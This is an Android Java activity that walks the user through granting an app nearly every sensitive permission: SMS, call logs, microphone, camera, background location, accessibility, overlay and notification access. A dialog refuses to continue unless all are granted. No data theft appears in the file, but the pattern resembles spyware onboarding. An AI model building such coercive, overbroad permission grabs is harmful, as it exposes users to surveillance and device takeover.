package com.ultimate.access;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.material.progressindicator.LinearProgressIndicator;

import java.util.ArrayList;
import java.util.List;

public class PermissionManagerActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 9999;
    private static final int OVERLAY_PERMISSION_CODE = 1001;
    private static final int USAGE_ACCESS_CODE = 1002;
    private static final int NOTIFICATION_LISTENER_CODE = 1003;
    private static final int ACCESSIBILITY_CODE = 1004;
    private static final int BATTERY_OPTIMIZATION_CODE = 1005;
    private static final int MANAGE_STORAGE_CODE = 1006;

    private Button btnGrantAll;
    private TextView tvStatus, tvProgress;
    private LinearProgressIndicator progressIndicator;
    private ProgressBar progressBar;

    private int totalPermissions = 0;
    private int grantedPermissions = 0;

    private String[] runtimePermissions = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_MEDIA_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.BODY_SENSORS,
            Manifest.permission.ACTIVITY_RECOGNITION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.ANSWER_PHONE_CALLS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.NEARBY_WIFI_DEVICES,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.BLUETOOTH_SCAN
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission_manager);

        btnGrantAll = findViewById(R.id.btn_grant_all);
        tvStatus = findViewById(R.id.tv_status);
        tvProgress = findViewById(R.id.tv_progress);
        progressIndicator = findViewById(R.id.progress_indicator);
        progressBar = findViewById(R.id.progress_bar);

        btnGrantAll.setOnClickListener(v -> {
            btnGrantAll.setEnabled(false);
            btnGrantAll.setText("Granting Permissions...");
            progressBar.setVisibility(android.view.View.VISIBLE);
            grantAllPermissions();
        });

        checkAndLaunchMain();
    }

    private void grantAllPermissions() {
        requestRuntimePermissions();
    }

    private void requestRuntimePermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        for (String permission : runtimePermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        totalPermissions = permissionsToRequest.size();
        grantedPermissions = runtimePermissions.length - totalPermissions;
        updateProgress();

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            requestSpecialPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            int granted = 0;
            for (int result : grantResults) {
                if (result == PackageManager.PERMISSION_GRANTED) granted++;
            }
            grantedPermissions += granted;
            updateProgress();

            boolean allRuntimeGranted = true;
            for (String permission : runtimePermissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    allRuntimeGranted = false;
                    break;
                }
            }

            if (allRuntimeGranted) {
                requestSpecialPermissions();
            } else {
                showPermissionDeniedDialog();
            }
        }
    }

    private void requestSpecialPermissions() {
        tvStatus.setText("Requesting special permissions...");

        // 1. Manage External Storage
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            }
        }

        // 2. Overlay Permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                return;
            }
        }

        // 3. Usage Stats
        if (!hasUsageStatsPermission()) {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivityForResult(intent, USAGE_ACCESS_CODE);
            return;
        }

        // 4. Notification Listener
        if (!isNotificationListenerEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivityForResult(intent, NOTIFICATION_LISTENER_CODE);
            return;
        }

        // 5. Accessibility
        if (!isAccessibilityServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, ACCESSIBILITY_CODE);
            return;
        }

        // 6. Battery Optimization
        if (!isIgnoringBatteryOptimizations()) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
            return;
        }

        allPermissionsGranted();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        requestSpecialPermissions();
    }

    private void allPermissionsGranted() {
        progressBar.setVisibility(android.view.View.GONE);
        btnGrantAll.setEnabled(true);
        btnGrantAll.setText("✓ ALL PERMISSIONS GRANTED");
        btnGrantAll.setBackgroundColor(getColor(android.R.color.holo_green_dark));
        tvStatus.setText("All permissions granted! Launching app...");
        tvProgress.setText("100% - Complete");
        progressIndicator.setProgress(100);

        UltimateApplication.setAllPermissionsGranted(true);

        Intent intent = new Intent(this, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
    }

    private void updateProgress() {
        int total = runtimePermissions.length;
        int percentage = (grantedPermissions * 100) / total;

        runOnUiThread(() -> {
            tvProgress.setText("Progress: " + grantedPermissions + "/" + total + " (" + percentage + "%)");
            progressIndicator.setProgress(percentage);
        });
    }

    private void showPermissionDeniedDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Permissions Required")
                .setMessage("All permissions are required for the app to function properly. Please grant all permissions.")
                .setPositiveButton("Try Again", (dialog, which) -> requestRuntimePermissions())
                .setNegativeButton("Exit", (dialog, which) -> finishAffinity())
                .setCancelable(false)
                .show();
    }

    private boolean hasUsageStatsPermission() {
        try {
            android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), getPackageName());
            return mode == android.app.AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isNotificationListenerEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }

    private boolean isAccessibilityServiceEnabled() {
        String service = getPackageName() + "/.services.AccessibilityService";
        String enabledServices = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return enabledServices != null && enabledServices.contains(service);
    }

    private boolean isIgnoringBatteryOptimizations() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return pm.isIgnoringBatteryOptimizations(getPackageName());
        }
        return true;
    }

    private void checkAndLaunchMain() {
        if (UltimateApplication.areAllPermissionsGranted()) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(intent);
            finish();
        }
    }
}